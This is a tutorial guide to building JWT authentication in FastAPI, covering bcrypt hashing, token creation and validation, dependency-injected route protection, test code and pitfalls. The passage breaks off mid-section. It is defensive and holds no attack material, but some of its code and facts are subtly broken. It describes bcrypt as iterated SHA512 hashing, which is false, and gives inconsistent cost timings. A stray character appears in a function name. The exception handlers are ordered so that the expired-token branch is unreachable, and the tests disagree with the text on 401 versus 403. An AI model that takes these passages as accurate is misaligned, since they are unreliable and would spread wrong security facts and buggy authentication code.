# JWT Authentication in FastAPI: Complete Teaching Guide

A comprehensive guide for data engineers transitioning to API development. This guide covers building secure JWT-based authentication from scratch.

---

## Table of Contents
1. [Complete Teaching Plan](#complete-teaching-plan)
2. [Step 2: Deep Dive - auth/security.py](#step-2-deep-dive---authsecuritypy)
3. [Code Skeleton with TODO Comments](#code-skeleton-with-todo-comments)
4. [Testing Checklist](#testing-checklist)
5. [Under the Hood Explanations](#under-the-hood-explanations)
6. [Common Pitfalls and Solutions](#common-pitfalls-and-solutions)

---

## Complete Teaching Plan

### Overview
JWT (JSON Web Token) authentication is a stateless approach to securing API endpoints. Unlike session-based authentication (which requires server-side storage), JWT tokens are self-contained and can be validated using only a secret key.

### Step 1: Environment Setup & Dependencies
**Goal**: Prepare your development environment with required libraries

**What you'll install:**
```
fastapi          # Web framework
uvicorn          # ASGI server
python-multipart # For form data handling
passlib          # Password hashing library
python-jose      # JWT library with cryptography support
pydantic         # Data validation
pydantic-settings # Configuration management
```

**Why each dependency:**
- `fastapi`: Modern web framework with automatic OpenAPI documentation
- `passlib`: Industry-standard password hashing (prevents plaintext passwords)
- `python-jose`: Implements JWT spec-compliant token creation/validation
- `pydantic`: Ensures type safety and automatic validation

### Step 2: Security Module (auth/security.py)
**Goal**: Build the core authentication logic - this is the HEART of the system

**Responsibilities:**
1. Hash passwords securely (never store plaintext)
2. Verify passwords during login
3. Create JWT tokens with expiration
4. Decode and validate JWT tokens
5. Extract user information from tokens

**Why separate this into its own module:**
- Single Responsibility Principle: Security logic is isolated
- Reusability: Import security functions in multiple endpoints
- Testability: Easy to unit test without full app context
- Maintainability: All auth logic in one place

**Detailed function breakdown:** (See Section 2 below for complete deep dive)

### Step 3: Database Models & User Management
**Goal**: Define how users are stored and retrieved

**Components:**
- Pydantic models (request/response schemas)
- SQLAlchemy models (database representation)
- Dependency functions (FastAPI's injection system)

**Key concepts:**
- Request models: Validate incoming data (e.g., `UserCreate`)
- Response models: Control what's sent back (never include passwords!)
- Database models: How data persists

### Step 4: Endpoints & Authentication Dependency
**Goal**: Create login endpoint and protect other endpoints

**Endpoints you'll build:**
- `POST /token` - Login, returns JWT token
- `GET /users/me` - Protected endpoint returning current user
- Any other endpoint that needs authentication

**How protection works:**
- Create a dependency function that extracts token from request
- Validate token signature, expiration, and claims
- Inject current user into endpoint function
- Return 401 if validation fails

### Step 5: Testing & Security Validation
**Goal**: Ensure everything works and is secure

**Test categories:**
- Happy path: Valid credentials → valid token
- Invalid credentials → proper error messages
- Expired tokens → rejection
- Tampered tokens → rejection
- Missing tokens → 401 Unauthorized

---

## Step 2: Deep Dive - auth/security.py

This is where all the cryptographic magic happens. Understanding this module is crucial for building secure systems.

### Overview of Functions

```
PASSWORD HASHING LAYER
├── get_password_hash(password: str) -> str
└── verify_password(plain_password: str, hashed_password: str) -> bool

JWT TOKEN LAYER
├── create_access_token(data: dict, expires_delta: Optional[timedelta]) -> str
├── decode_access_token(token: str) -> dict
└── verify_token(token: str) -> dict

DEPENDENCY INJECTION LAYER
└── get_current_user(token: str) -> User
```

---

### Function 1: `get_password_hash(password: str) -> str`

#### What it does:
Converts a plaintext password into an irreversible hash using the bcrypt algorithm.

#### Why it exists:
**CRITICAL SECURITY PRINCIPLE:** Never store plaintext passwords. If your database is compromised, attackers get passwords. Using a hash means even YOU can't see users' passwords.

#### Under the hood:
```
INPUT: "my_secure_password_123"
            ↓
   [Bcrypt Algorithm]
   (Uses random salt + multiple iterations)
            ↓
OUTPUT: "$2b$12$NixWe7qSsvgQeObLxVrCm.KZbC5/gVscvyQw6J0UO2ZyWwkiJckhm"
```

#### Code breakdown:
```python
def get_password_hash(password: str) -> str:
    # pwd_context is a CryptContext from passlib
    # Configured to use bcrypt algorithm
    return pwd_context.hash(password)
```

**Why bcrypt specifically:**
- **Adaptive**: Gets slower as computers get faster (automatically resists brute force)
- **Salted**: Each hash includes random salt (same password = different hash)
- **Industry standard**: Used by major platforms (GitHub, Facebook, etc.)

#### Complexity parameter:
Bcrypt uses a "cost" parameter (default 12, can be 4-31):
- Cost 4: ~0.01 seconds (testing only)
- Cost 12: ~0.3 seconds (production standard)
- Cost 15: ~1 second (extra paranoid)

Higher cost = harder to brute force, but slower legitimate login.

#### Example flow:
```
User signs up with password "MyP@ssw0rd!"
                    ↓
        get_password_hash() is called
                    ↓
        Bcrypt generates random salt
                    ↓
        Password + salt hashed 2^12 times
                    ↓
    Hash stored in DB: $2b$12$kR9...
    Original password: forgotten (only server sees it during signup)
```

---

### Function 2: `verify_password(plain_password: str, hashed_password: str) -> bool`

#### What it does:
Checks if a plaintext password matches a stored hash WITHOUT storing the plaintext.

#### Why it exists:
During login, user provides their password. We can't compare plaintext-to-plaintext (we don't store plaintext). We need a way to compare safely.

#### The clever part:
Bcrypt stores the salt IN the hash string itself. This allows verification without storing salt separately.

#### Under the hood:
```
STORED IN DB: "$2b$12$NixWe7qSsvgQeObLxVrCm.KZbC5/gVscvyQw6J0UO2ZyWwkiJckhm"
                    ↓
         Extract salt: $2b$12$NixWe7qSsvgQeObLxVrCm
                    ↓
USER ENTERS: "my_secure_password_123"
                    ↓
    Hash with extracted salt
                    ↓
COMPARE: New hash == Stored hash?
```

#### Code breakdown:
```python
def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)
    # Returns True only if they match
    # Takes ~0.3 seconds (by design - prevents rapid-fire attacks)
```

#### Security properties:
- **Timing-safe comparison**: Always takes same time (prevents timing attacks)
- **Irreversible**: Can't reverse hash to get password
- **One-way check**: Only verifies matching, never reveals actual password

#### Example:
```
Login attempt: User enters "WrongPassword"
Stored hash: "$2b$12$..."
                    ↓
verify_password("WrongPassword", "$2b$12$...")
                    ↓
    Hash "WrongPassword" with extracted salt
                    ↓
    New hash ≠ Stored hash
                    ↓
    Return False → Login rejected
```

---

### Function 3: `create_access_token(data: dict, expires_delta: Optional[timedelta]) -> str`

#### What it does:
Creates a JWT token containing user data, signs it with a secret, sets expiration.

#### Why it exists:
After successful login, we need to give the user something to present on future requests. This token proves they've already authenticated without needing to hash passwords again.

#### JWT Structure (3 parts separated by dots):
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiI1IiwiZXhwIjoxNTc5ODA4MDAwfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

HEADER.PAYLOAD.SIGNATURE
```

#### Detailed breakdown:

##### Part 1: HEADER
```json
{
  "alg": "HS256",  // Algorithm: HMAC with SHA-256
  "typ": "JWT"     // Type identifier
}
```
Base64URL encoded: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

##### Part 2: PAYLOAD (Claims)
```json
{
  "sub": "5",                    // Subject: User ID (required)
  "exp": 1579808000,            // Expiration: Unix timestamp
  "iat": 1579721600,            // Issued at: Unix timestamp
  "custom_claim": "custom_value" // Any custom data
}
```
Base64URL encoded: `eyJzdWIiOiI1IiwiZXhwIjoxNTc5ODA4MDAwfQ`

##### Part 3: SIGNATURE
```
HMACSHA256(
  base64UrlEncode(header) + "." + 
  base64UrlEncode(payload),
  your_secret_key
)
```
Result: `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

#### Why 3 parts?
- **Header**: Tells recipient how it was signed
- **Payload**: Actual user data (human-readable when base64 decoded)
- **Signature**: Proves nobody tampered with header+payload

#### Code breakdown:
```python
def create_access_§token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    # Make a copy to avoid modifying original
    to_encode = data.copy()
    
    # Set expiration time
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(minutes=15)  # Default
    
    # Add expiration to payload
    to_encode.update({"exp": expire})
    
    # Create JWT: encodes, signs, returns string
    encoded_jwt = jose.jwt.encode(
        to_encode,           # Payload data
        SECRET_KEY,          # Signing secret
        algorithm=ALGORITHM  # HS256 (HMAC-SHA256)
    )
    
    return encoded_jwt  # String safe to send to client
```

#### Token lifecycle:
```
1. User logs in successfully
   ↓
2. create_access_token() called with user_id="123"
   ↓
3. Token generated: "eyJhbG..."
   ↓
4. Sent to client in response
   ↓
5. Client stores in browser/localStorage
   ↓
6. Client includes in future requests: "Authorization: Bearer eyJhbG..."
   ↓
7. Server validates token (see next function)
   ↓
8. If expired (current_time > exp): rejected
   ↓
9. If tampered: rejected (signature won't match)
```

#### Expiration timing:
- **Short-lived (15 min)**: Secure but user needs to re-login frequently
- **Medium (1 hour)**: Standard balance
- **Long-lived (7 days)**: User convenience, but more risk if stolen
- **Never expire**: Dangerous (stolen token works forever)

**Best practice:**
```
Access token (short): 15-60 minutes
Refresh token (long): 7-30 days
```

---

### Function 4: `decode_access_token(token: str) -> dict`

#### What it does:
Extracts and validates a JWT token, returns the payload if valid.

#### Why it exists:
When a client sends a token, we need to:
1. Verify it wasn't tampered with (signature check)
2. Verify it hasn't expired (expiration check)
3. Extract the user data inside it

#### Under the hood:
```
RECEIVED TOKEN: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1IiwiZXhwIjoxNTc5ODA4MDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                    ↓
        Split by dots into 3 parts
                    ↓
    SIGNATURE VERIFICATION:
    
    Take: base64UrlEncode(header) + "." + base64UrlEncode(payload)
    Sign it with SECRET_KEY
    Compare new signature with received signature
    
    ✗ No match? → Invalid token (tampered)
    ✓ Match? → Continue
                    ↓
    EXPIRATION CHECK:
    
    Extract exp from payload
    If current_time > exp → Expired
    ✗ Expired? → Invalid token
    ✓ Valid? → Continue
                    ↓
    RETURN PAYLOAD: {"sub": "5", "exp": 1579808000}
```

#### Code breakdown:
```python
def decode_access_token(token: str) -> dict:
    try:
        # Verify signature and decode payload
        payload = jose.jwt.decode(
            token,               # Token string
            SECRET_KEY,          # Must match signing key
            algorithms=[ALGORITHM]  # Must match signing algorithm
        )
        
        # Extract user ID (subject claim)
        user_id: str = payload.get("sub")
        
        # If no user_id, payload is invalid
        if user_id is None:
            raise ValueError("Invalid token: no user_id")
        
        return payload  # {"sub": "5", "exp": 1579808000, ...}
        
    except JWTError:  # Signature invalid
        raise HTTPException(status_code=401, detail="Invalid token")
    except ExpiredSignatureError:  # Token expired
        raise HTTPException(status_code=401, detail="Token expired")
```

#### Automatic validations by jose.jwt.decode():
- ✓ Checks signature (catches tampering)
- ✓ Checks expiration (catches expired tokens)
- ✓ Validates JWT structure (catches malformed tokens)

#### Security: Why signature verification matters
```
ATTACKER SCENARIO:

Original token: eyJhbGc...SIGNATURE1
                      ↓
Attacker edits payload to change user_id from 5 to 1
                      ↓
New token: eyJhbGc...ALTERED_PAYLOAD.SIGNATURE1
                      ↓
Server receives token, tries to verify signature
                      ↓
Signs: base64(header) + ALTERED_PAYLOAD with SECRET_KEY
                      ↓
New signature ≠ SIGNATURE1 (from token)
                    ↓
✗ REJECTED: "Invalid signature"

RESULT: Attacker cannot impersonate another user
```

---

### Function 5: `verify_token(token: str) -> dict`

#### What it does:
Wrapper around `decode_access_token` that extracts just the user_id from the token.

#### Why it exists:
Cleaner interface - callers just need user_id, not whole payload.

#### Code:
```python
def verify_token(token: str) -> str:
    payload = decode_access_token(token)
    user_id: str = payload.get("sub")
    
    if user_id is None:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    return user_id
```

---

### Function 6: `get_current_user(token: str = Depends(oauth2_scheme)) -> User`

#### What it does:
FastAPI dependency that extracts the "Authorization: Bearer <token>" header, validates token, and returns the authenticated user.

#### Why it exists:
Allows you to write protected endpoints like:
```python
@app.get("/users/me")
def get_profile(current_user: User = Depends(get_current_user)):
    return current_user  # current_user is automatically validated
```

#### How FastAPI Dependency Injection works:
```
REQUEST: GET /users/me
         Header: Authorization: Bearer eyJhbGc...
                    ↓
FastAPI sees: endpoint needs current_user parameter
         Has Depends(get_current_user)
                    ↓
FastAPI calls: get_current_user(token from Authorization header)
                    ↓
get_current_user:
  1. Validates token
  2. Extracts user_id
  3. Queries database for User
  4. Returns User object
                    ↓
FastAPI injects User into endpoint function
                    ↓
Endpoint code executes with user available
                    ↓
Return response
```

#### OAuth2PasswordBearer:
```python
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")
```

This tells FastAPI:
- Tokens are sent in "Authorization" header
- Format: "Bearer <token>"
- Token endpoint is POST /token

#### Code breakdown:
```python
def get_current_user(
    token: str = Depends(oauth2_scheme)  # Extract from Authorization header
) -> User:
    # Verify token validity
    user_id = verify_token(token)
    
    # Query database for user
    user = db.get_user(user_id)
    
    if user is None:
        raise HTTPException(status_code=401, detail="User not found")
    
    return user
```

#### Request flow with this dependency:
```
Client sends: GET /users/me
              Authorization: Bearer eyJhbGc...
                    ↓
FastAPI intercepts request
                    ↓
Extracts token from Authorization header
                    ↓
Calls get_current_user(token="eyJhbGc...")
                    ↓
Token decoded: sub="123"
                    ↓
Database lookup: User(id=123, username="alice")
                    ↓
Endpoint receives: current_user=User(id=123, ...)
                    ↓
Endpoint executes, returns data
                    ↓
401 sent if any step fails
```

---

## Code Skeleton with TODO Comments

### File 1: `auth/security.py`

```python
"""
Security module: Handles password hashing and JWT token management.

Core responsibilities:
- Hash passwords securely (never store plaintext)
- Verify passwords during login
- Create JWT tokens with expiration
- Decode and validate JWT tokens
- Dependency injection for FastAPI endpoint protection
"""

from datetime import datetime, timedelta
from typing import Optional

# TODO: Import necessary modules
# from passlib.context import CryptContext
# from jose import JWTError, jwt
# from fastapi import Depends, HTTPException, status
# from fastapi.security import OAuth2PasswordBearer
# from pydantic import BaseModel

# TODO: Configure password hashing
# pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

# TODO: Configure JWT settings
# SECRET_KEY = "your-secret-key-here"  # Use environment variable in production!
# ALGORITHM = "HS256"
# ACCESS_TOKEN_EXPIRE_MINUTES = 30

# TODO: Configure OAuth2 scheme
# oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")


# ============================================================================
# PASSWORD HASHING FUNCTIONS
# ============================================================================

def get_password_hash(password: str) -> str:
    """
    Hash a plaintext password using bcrypt.
    
    Args:
        password: The plaintext password to hash
    
    Returns:
        Hashed password (bcrypt hash starting with $2b$)
    
    Why: Never store plaintext passwords. This is irreversible by design.
    """
    # TODO: Implement password hashing
    # return pwd_context.hash(password)
    pass


def verify_password(plain_password: str, hashed_password: str) -> bool:
    """
    Verify that a plaintext password matches a stored hash.
    
    Args:
        plain_password: Password entered by user
        hashed_password: Hash stored in database
    
    Returns:
        True if password matches hash, False otherwise
    
    Why: Login verification without storing plaintext passwords.
         Uses timing-safe comparison to prevent timing attacks.
    """
    # TODO: Implement password verification
    # return pwd_context.verify(plain_password, hashed_password)
    pass


# ============================================================================
# JWT TOKEN FUNCTIONS
# ============================================================================

def create_access_token(
    data: dict,
    expires_delta: Optional[timedelta] = None
) -> str:
    """
    Create a JWT access token.
    
    Args:
        data: Dictionary to encode in token (should include "sub" for user_id)
        expires_delta: How long token is valid. Defaults to 30 minutes.
    
    Returns:
        JWT token as string (safe to send to client)
    
    Why: After login, give user a token to prove authentication on future requests.
         Token expires to limit damage if stolen.
    
    Example:
        token = create_access_token(
            data={"sub": "user_123"},
            expires_delta=timedelta(minutes=30)
        )
        # Returns: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWI..."
    """
    # TODO: Implement token creation
    # 1. Make a copy of data
    # 2. Set expiration time
    # 3. Add expiration to payload
    # 4. Encode with jwt.encode()
    # 5. Return encoded token
    pass


def decode_access_token(token: str) -> dict:
    """
    Decode and validate a JWT token.
    
    Args:
        token: JWT token string to decode
    
    Returns:
        Decoded payload dictionary (includes "sub" for user_id)
    
    Raises:
        HTTPException: If token is invalid, expired, or tampered
    
    Why: Verify token hasn't been tampered with or expired before using it.
    
    Under the hood:
    - Verifies signature (catches tampering)
    - Checks expiration time
    - Validates JWT structure
    """
    # TODO: Implement token decoding
    # 1. Try to decode token with jwt.decode()
    # 2. Extract and validate "sub" claim
    # 3. Catch JWTError and ExpiredSignatureError
    # 4. Raise HTTPException with appropriate error messages
    pass


def verify_token(token: str) -> str:
    """
    Verify token and extract user_id.
    
    Args:
        token: JWT token string
    
    Returns:
        User ID from token's "sub" claim
    
    Raises:
        HTTPException: If token is invalid
    
    Why: Simple wrapper for getting just the user_id from a token.
    """
    # TODO: Implement token verification
    # 1. Call decode_access_token()
    # 2. Extract "sub" from payload
    # 3. Return user_id
    pass


# ============================================================================
# FASTAPI DEPENDENCY INJECTION
# ============================================================================

def get_current_user(token: str = Depends(oauth2_scheme)):
    """
    FastAPI dependency for protecting endpoints.
    
    Usage:
        @app.get("/users/me")
        def get_profile(current_user: User = Depends(get_current_user)):
            return current_user
    
    How it works:
    1. FastAPI extracts token from "Authorization: Bearer <token>" header
    2. Calls this function to validate token
    3. Injects authenticated user into endpoint
    4. Returns 401 if validation fails
    
    Args:
        token: JWT token from Authorization header (auto-extracted by FastAPI)
    
    Returns:
        Authenticated User object
    
    Raises:
        HTTPException(401): If token invalid, expired, or user not found
    """
    # TODO: Implement current user retrieval
    # 1. Verify token and extract user_id
    # 2. Query database for user
    # 3. Check user exists
    # 4. Return user object
    pass
```

### File 2: `main.py` (Basic Endpoint Integration)

```python
"""
Main FastAPI application with authentication endpoints.
"""

from fastapi import FastAPI, Depends, HTTPException, status
from datetime import timedelta

# TODO: Import from your modules
# from auth.security import (
#     create_access_token,
#     get_current_user,
#     verify_password,
#     get_password_hash,
#     ACCESS_TOKEN_EXPIRE_MINUTES,
#     TokenResponse,
#     User
# )
# from database import get_user_by_username, get_user

app = FastAPI(title="JWT Authentication Example")


# ============================================================================
# LOGIN ENDPOINT
# ============================================================================

@app.post("/token", response_model=TokenResponse)
def login(username: str, password: str):
    """
    Login endpoint: Authenticate user and return JWT token.
    
    Args:
        username: User's username
        password: User's plaintext password
    
    Returns:
        {"access_token": "eyJhbGc...", "token_type": "bearer"}
    
    Raises:
        HTTPException(401): Invalid credentials
    
    Process:
    1. Look up user by username
    2. Verify password matches hash
    3. Create access token
    4. Return token to client
    """
    # TODO: Implement login
    # 1. Query database for user by username
    # 2. If user not found: raise 401
    # 3. If password doesn't verify: raise 401
    # 4. Create access token with user_id
    # 5. Return {"access_token": token, "token_type": "bearer"}
    pass


# ============================================================================
# PROTECTED ENDPOINT
# ============================================================================

@app.get("/users/me", response_model=User)
def get_current_user_profile(current_user: User = Depends(get_current_user)):
    """
    Get current authenticated user's profile.
    
    Protected endpoint example: Requires valid JWT token.
    
    Args:
        current_user: Injected by FastAPI dependency injection
    
    Returns:
        Current user's profile
    
    How it works:
    1. FastAPI intercepts request
    2. Extracts token from Authorization header
    3. Calls get_current_user() to validate
    4. Injects authenticated user
    5. Endpoint returns user data
    6. Returns 401 if token missing/invalid/expired
    """
    return current_user


# ============================================================================
# OPTIONAL: REFRESH TOKEN ENDPOINT (Advanced)
# ============================================================================

@app.post("/token/refresh", response_model=TokenResponse)
def refresh_token(current_user: User = Depends(get_current_user)):
    """
    Advanced: Refresh access token using current user.
    
    Allows user to get a fresh token without re-entering password.
    Useful for long-lived sessions while keeping individual tokens short-lived.
    """
    # TODO: Implement token refresh
    # 1. Receive current token (validated automatically)
    # 2. Create new token with same user_id
    # 3. Return new token
    pass
```

---

## Testing Checklist

### Pre-Testing Setup
```bash
# Install test dependencies
pip install pytest pytest-asyncio httpx

# Create tests/test_auth.py
```

### Test Cases

#### 1. Password Hashing Tests
- [ ] Hashing same password twice produces different hashes (random salt)
- [ ] Verify correct password returns True
- [ ] Verify incorrect password returns False
- [ ] Hashed password is not plaintext
- [ ] Can't reverse hash to get original password

**Test code:**
```python
def test_password_hashing():
    password = "MySecure123!"
    
    hash1 = get_password_hash(password)
    hash2 = get_password_hash(password)
    
    # Different hashes (random salt)
    assert hash1 != hash2
    
    # But both verify correctly
    assert verify_password(password, hash1) is True
    assert verify_password(password, hash2) is True
    
    # Wrong password fails
    assert verify_password("WrongPassword", hash1) is False
    
    # Hash doesn't contain plaintext
    assert password not in hash1
```

#### 2. Token Creation Tests
- [ ] Token format is valid JWT (3 parts separated by dots)
- [ ] Token contains correct user_id in "sub" claim
- [ ] Token contains expiration in "exp" claim
- [ ] Default expiration is 30 minutes
- [ ] Custom expiration works

**Test code:**
```python
def test_token_creation():
    token = create_access_token({"sub": "user_123"})
    
    # Valid JWT format
    parts = token.split(".")
    assert len(parts) == 3
    
    # Can decode
    payload = decode_access_token(token)
    assert payload["sub"] == "user_123"
    
    # Has expiration
    assert "exp" in payload
    assert payload["exp"] > datetime.utcnow().timestamp()
```

#### 3. Token Decoding Tests
- [ ] Valid token decodes successfully
- [ ] Invalid signature rejected
- [ ] Expired token rejected
- [ ] Malformed token rejected
- [ ] Token with wrong algorithm rejected

**Test code:**
```python
def test_token_validation():
    # Valid token
    token = create_access_token({"sub": "user_123"})
    payload = decode_access_token(token)
    assert payload["sub"] == "user_123"
    
    # Tampered signature
    tampered = token[:-10] + "XXXXXXXXXX"
    with pytest.raises(HTTPException):
        decode_access_token(tampered)
    
    # Expired token
    past_date = datetime.utcnow() - timedelta(hours=1)
    expired_token = create_access_token(
        {"sub": "user_123"},
        expires_delta=timedelta(seconds=-1)
    )
    with pytest.raises(HTTPException):
        decode_access_token(expired_token)
```

#### 4. Login Endpoint Tests
- [ ] Valid credentials return token
- [ ] Invalid username returns 401
- [ ] Invalid password returns 401
- [ ] Token in response is valid
- [ ] Can use token in subsequent requests

**Test code:**
```python
def test_login_endpoint():
    # Setup: Create user
    client = TestClient(app)
    client.post("/users", json={"username": "alice", "password": "secure123"})
    
    # Valid login
    response = client.post("/token", data={"username": "alice", "password": "secure123"})
    assert response.status_code == 200
    assert "access_token" in response.json()
    
    # Invalid username
    response = client.post("/token", data={"username": "bob", "password": "secure123"})
    assert response.status_code == 401
    
    # Invalid password
    response = client.post("/token", data={"username": "alice", "password": "wrong"})
    assert response.status_code == 401
```

#### 5. Protected Endpoint Tests
- [ ] Valid token grants access
- [ ] Missing token returns 401
- [ ] Invalid token returns 401
- [ ] Expired token returns 401
- [ ] Current user returned is correct

**Test code:**
```python
def test_protected_endpoint():
    client = TestClient(app)
    
    # Setup user and login
    token = "valid_token_here"  # Get real token from login
    
    # Valid token
    response = client.get(
        "/users/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200
    
    # Missing token
    response = client.get("/users/me")
    assert response.status_code == 403
    
    # Invalid token
    response = client.get(
        "/users/me",
        headers={"Authorization": "Bearer invalid_token"}
    )
    assert response.status_code == 401
```

#### 6. Edge Cases & Security
- [ ] Very long passwords handled correctly
- [ ] Special characters in passwords work
- [ ] SQL injection attempts rejected
- [ ] XSS attempts in token rejected
- [ ] Multiple simultaneous logins work
- [ ] Token not valid across different users

**Test code:**
```python
def test_edge_cases():
    # Long password
    long_password = "x" * 1000
    hash1 = get_password_hash(long_password)
    assert verify_password(long_password, hash1) is True
    
    # Special characters
    special = "p@$$w0rd!#%&<>\"'"
    hash2 = get_password_hash(special)
    assert verify_password(special, hash2) is True
    
    # Token for user_123 shouldn't work for user_456
    token_123 = create_access_token({"sub": "123"})
    payload = decode_access_token(token_123)
    assert payload["sub"] == "123"
```

### Manual Testing via Swagger UI
1. Start app: `uvicorn main:app --reload`
2. Open http://localhost:8000/docs
3. Use interactive Swagger UI to:
   - Call POST /token with valid credentials
   - Copy returned token
   - Click "Authorize" button
   - Paste token in Bearer field
   - Call GET /users/me
   - Verify response includes your user data

---

## Under the Hood Explanations

### How Bcrypt Works (Deep Dive)

#### The Problem: Simple Hashing
```
Bad approach:
password = "mypassword"
hash = SHA256(password)
# If database leaked, attacker can:
# 1. Find common passwords in SHA256 databases
# 2. Crack weak passwords quickly (trillions of hashes/sec)
```

#### The Bcrypt Solution
```
Good approach:
password = "mypassword"
salt = random_salt()
for i in range(2^12):  # 4096 iterations
    password = SHA512(password + salt)
hash = "$2b$12$" + salt + password
# Now takes 0.3 seconds per attempt
# Even weak passwords take hours to crack
```

#### Key insight:
Bcrypt was designed in 2000 when computers were slower. It's parameterized to automatically adapt:
- 2000: Cost 4 takes ~0.1 seconds
- 2024: Same cost 4 takes microseconds (too fast!)
- 2000: Cost 10 takes ~10 seconds
- 2024: Same cost 10 takes 0.1 seconds (reasonable)

Computer power doubles ~every 2 years, so we increase cost parameter to compensate.

### How JWT Works (Deep Dive)

#### Structure Encoding
```
Step 1: Create header
{
  "alg": "HS256",
  "typ": "JWT"
}
↓ JSON encode
{"alg":"HS256","typ":"JWT"}
↓ Base64URL encode (special variant of Base64)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Step 2: Create payload
{
  "sub": "user_123",
  "exp": 1234567890,
  "iat": 1234567000
}
↓ JSON encode
{"sub":"user_123","exp":1234567890,"iat":1234567000}
↓ Base64URL encode
eyJzdWIiOiJ1c2VyXzEyMyIsImV4cCI6MTIzNDU2Nzg5MCwiaWF0IjoxMjM0NTY3MDAwfQ

Step 3: Create signature
input = base64url(header) + "." + base64url(payload)
signature = HMAC_SHA256(input, SECRET_KEY)
= SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
↓ Already in Base64URL

Step 4: Concatenate
token = eyJhbGc...9cCI6IkpXVCJ9 . eyJzdWI... . SflKxwRJSM...
```

#### Why Base64URL?
Regular Base64 uses `+`, `/`, and `=` which have special meanings in URLs.
Base64URL replaces:
- `+` → `-`
- `/` → `_`
- `=` → omitted (padding)

This makes tokens URL-safe.

#### Signing verification flow
```
Received token: header.payload.signature_received

Step 1: Split by dots
header = "eyJhbGc..."
payload = "eyJzdWI..."
signature_received = "SflKxwRJSM..."

Step 2: Reconstruct signature
input = header + "." + payload
signature_calculated = HMAC_SHA256(input, SECRET_KEY)

Step 3: Compare
if signature_calculated == signature_received:
    ✓ Token is authentic
else:
    ✗ Token is forged/tampered
```

**Why this works:**
If attacker modifies payload:
- They can't recalculate signature (don't have SECRET_KEY)
- They must tamper with signature_received too
- But they don't know what to set it to
- Server calculates signature_calculated, it doesn't match
- Rejection!

### Session vs JWT Comparison

#### Session-Based (Traditional)
```
Client                          Server
  ↓                               ↓
User logs in
  ↓ POST /login
    {"username": "alice", "password": "..."}
                 ↓
           Validate credentials
           ↓
           Create session
           Store in RAM:
           {
             "session_123": {
               "user_id": 5,
               "login_time": 1234567890
             }
           }
           ↓
  ← Response: Set-Cookie: session=session_123
  ↓ (stored in browser)
  
User accesses /users/me
  ↓ GET /users/me
    Cookie: session_123
                 ↓
           Look up session_123 in RAM
           Found: user_id=5
           ↓
  ← Response: {"id": 5, "username": "alice"}

SERVER STORAGE: Needs to store every active session
SCALABILITY: In a multi-server setup, needs shared session storage
```

#### JWT-Based (Stateless)
```
Client                          Server
  ↓                               ↓
User logs in
  ↓ POST /login
    {"username": "alice", "password": "..."}
                 ↓
           Validate credentials
           ↓
           Create JWT token:
           {
             "sub": "5",
             "exp": 1234567890,
             "iat": 1234567000
           }
           Sign with SECRET_KEY
           ↓
  ← Response: {"access_token": "eyJhbGc..."}
  ↓ (stored in localStorage)
  
User accesses /users/me
  ↓ GET /users/me
    Authorization: Bearer eyJhbGc...
                 ↓
           Decode token
           Verify signature (no lookup needed!)
           Check expiration
           Extract user_id=5
           ↓
  ← Response: {"id": 5, "username": "alice"}

SERVER STORAGE: No storage needed!
SCALABILITY: Works across multiple servers
              (each server has same SECRET_KEY)
```

#### Trade-offs:
| Aspect | Sessions | JWT |
|--------|----------|-----|
| **Server load** | High (storage) | Low (stateless) |
| **Scalability** | Need shared DB | Works distributed |
| **Revocation** | Immediate | Not until expiration |
| **Complexity** | Simple | Understand crypto |
| **Token size** | Small | Medium (more data in token) |
| **Refresh** | Automatic | Need refresh endpoint |

### Expiration and Refresh Tokens

#### The 15-minute token problem
```
If access_token expires in 15 minutes:
- User experience: "Sorry, you were logged out"
- Force re-login: User enters password
- Bad UX

Solution: Refresh tokens!
```

#### Refresh token flow:
```
1. Login
   ↓
   POST /token
   {username, password}
   ↓
   Server returns:
   {
     "access_token": "short_lived_token",    // 15 min expiration
     "refresh_token": "long_lived_token"     // 7 day expiration
   }
   ↓
   Client stores BOTH tokens

2. Normal requests (next 15 minutes)
   GET /users/me
   Authorization: Bearer short_lived_token
   ↓ Works! Returns data

3. Token expires (minute 16)
   GET /users/me
   Authorization: Bearer short_lived_token
   ↓ Returns 401: Token expired

4. Client uses refresh token
   POST /token/refresh
   Authorization: Bearer long_lived_token
   ↓
   Server verifies refresh_token (still valid)
   ↓
   Returns new access_token (fresh 15 min expiration)
   {
     "access_token": "new_short_lived_token",
     "refresh_token": "long_lived_token"     // Can reuse or rotate
   }
   ↓
   Client updates stored access_token

5. Continue using API with new token
   GET /users/me
   Authorization: Bearer new_short_lived_token
   ↓ Works!
```

#### Security benefit:
```
If access_token stolen:
- Only valid for 15 minutes
- Attacker can use it briefly
- Token expires, access denied

If refresh_token stolen:
- Can get new access_tokens
- More serious compromise
- Keep refresh_token in HttpOnly cookie (JavaScript can't access)
- Serve only HTTPS (encrypted in transit)
```

---

## Common Pitfalls and How to Avoid Them

### Pitfall 1: Hardcoded SECRET_KEY in Source Code

#### The Problem:
```python
# ✗ BAD - Never do this!
SECRET_KEY = "super_secret_key_12345"

# If code leaked to GitHub:
# 1. Anyone can forge valid tokens
# 2. Can impersonate any user
# 3. No way to fix without changing all tokens
```

#### The Solution:
```python
# ✓ GOOD - Use environment variables
import os
from dotenv import load_dotenv

load_dotenv()
SECRET_KEY = os.getenv("SECRET_KEY")

if not SECRET_KEY:
    raise ValueError("SECRET_KEY environment variable not set")

# Development (.env file - NEVER commit this):
